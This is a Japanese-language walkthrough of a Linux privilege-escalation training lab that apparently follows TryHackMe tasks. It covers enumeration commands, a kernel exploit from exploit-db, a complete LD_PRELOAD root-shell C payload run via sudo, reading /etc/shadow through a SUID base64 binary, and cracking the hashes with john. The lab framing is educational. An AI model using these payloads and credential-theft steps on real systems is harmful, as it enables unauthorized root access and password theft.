# Linux Privilege Escalation

## 環境

Username: karen  
Password: Password1

## Task3 Enumeration（列挙）

### 情報表示系コマンド

```shell
$ hostname    # ホスト名を表示
$ uname -a    # カーネルの情報を表示
$ cat /proc/version  # カーネルのバージョンに関する情報など
$ cat /etc/issue     # OSに関する情報を表示
$ ps -A       # 実行中のすべてのプロセスを表示
$ ps -axjf    # プロセスツリーを表示
$ ps aux      # すべてのユーザのプロセスを表示(a)、プロセスを起動したユーザを表示(u)、端末に接続されていないプロセスを表示(x)
$ env         # 環境変するを表示
$ sudo -l     # sudoコマンドを使用してユーザが実行できるコマンドを表示
$ id          # ユーザの特権レベルとグループを表示
$ cat /etc/passwd # システム上のユーザ情報一覧
$ history     # コマンドの使用履歴
$ ifconfig    # ネットワークインターフェースに関する情報
$ ip route    # ルーティングテーブルの表示
$ netstat -a  # すべてのListenポートとEstablishされた接続を表示
$ netstat -at # すべてのTCP接続。-uならUPD接続
$ netstat -tp # -p はPIDとサービス名を表示
```

### 検索コマンド

```shell
$ find . -name flag1.txt  # 現在のディレクトリで「flag1.txt」という名前のファイルを見つけます。
$ find / -type d -name config # 「/」の下にある config という名前のディレクトリを見つけます。
$ find / -type f -perm 0777 # 777 パーミッションを持つファイルを検索 (すべてのユーザーが読み取り、書き込み、および実行できるファイル)
$ find / -perm a=x # 実行可能ファイルを見つける
$ find /home -user frank # 「/home」の下にあるユーザー「frank」のすべてのファイルを検索します
$ find / -mtime 10 # 過去 10 日間に変更されたファイルを検索します
$ find / -atime 10 # 過去 10 日間にアクセスされたファイルを検索します
$ find / -cmin -60 # 過去 1 時間 (60 分) 以内に変更されたファイルを検索
$ find / -amin -60 # 過去 1 時間 (60 分) 以内のファイル アクセスを検索
$ find / -size 50M # サイズが 50 MB のファイルを検索
$ find / -perm -u=s -type f 2>/dev/null # SUIDビットガセットされているファイルを検索します。
```

## Task4 Automated Enumeration Tools(自動列挙ツール)

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES(Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)


## Task5 Privilege Escalation: Kernel Exploits

### カーネルエクスプロイトの手順

1. カーネルのバージョンを特定する
2. ターゲットシステムのカーネルバージョンのエクスプロイトコードを検索して見つける
3. エクスプロイトを実行する

### 情報源

- Google検索
- [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
- LES (Linux Exploit Suggester) などのスクリプトを使用する

### タスク5の質問と解答

[ここ](https://www.exploit-db.com/exploits/37292)にあるコードをコンパイルして実行するとルートになれる

```shell
$ gcc ofs.c -o ofs
$ ./ofs
```
後は find で flag1.txtを探して中身を確認。

## Task6 Sudo

[sudo権限を持つコマンドの使用方法](https://gtfobins.github.io/)

### LD_PRELOADを利用した権限昇格手順

LD_PRELOADは任意のプログラムが共有ライブラリを使用できるようにする機能。

権限昇格手順は以下の通り。
1. LD_PRELOADを確認する(env_keepオプションを利用)
2. 共有オブジェクト(.so拡張子)ファイルとしてコンパイルされたCコードを作成
3. sudo権限と.soファイルを指すLD_PRELOADオプションでプログラムを実行

コード例

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

このコードをshell.cとして保存し、gccで共有オブジェクトとしてコンパイル

```shell
gcc -fPIC -shared -o shell.so shell.c --nostartfiles
```

sudoで実行できるプログラムを実行時に、この共有オブジェクトファイルを使用するように指定する

```shell
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

### タスク6の質問と解答

1. sudo -lの出力を確認すればよい
2. /home/ubuntuにflag2.txtがあるのでcatで見る
3. https://gtfobins.github.io/ でnmapの欄を確認し、sudoでの特権昇格方
法に記載のとおり実行すればよい
4. sudo -l で確認すると/usr/bin/nanoが含まれているので、上記3のURLでnanoの欄を確認し、sudo出の特権昇格方法に記載のとおり実行すればよい

## Task7 Privilege Escalation:SUID

opensslを使用したハッシュパスワードの作成

```shell
$ openssl passwd -l -salt THM password1
$1$THM$WnbwlliCqxFRQepUTCkUT1
```

### タスク7質問と解答

1. cat /etc/passwdの表示を確認
2. 以下の手順で確認
  - findコマンドでSUIDビットが立っているファイルを探す

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```

  - [GTFOBins](https://gtfobins.github.io/#%2Bsuid)で使えそうなコマンドを探すとbase64があったので以下のコマンドを実行

```shell
base64 /etc/shadow | base64 --decode
```

  - /etc/shadowの内容が表示されるので、user2の行をコピペし手元のKali Linuxで、shadow.txtファイルとして保存。
  - /etc/passwdからuser2の行をコピペし手元のKali Linuxで、passwd.txtファイルとして保存。
  - 手元のKali Linuxで以下のコマンドを実行

```shell
unshadow passwd.txt shadow.txt > password.txt
```

  - john the ripperでpassword.txtを解析

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt password.txt
```

3. 以下の手順で確認

  - findでflag3.txtを探す

```shell
find / -name '*flag3.txt' -ls 2>/dev/null
```
  - base64でflag3.txtの内容を確認
  
```shell
base64 /home/ubuntu/flag3.txt | base64 --decode
```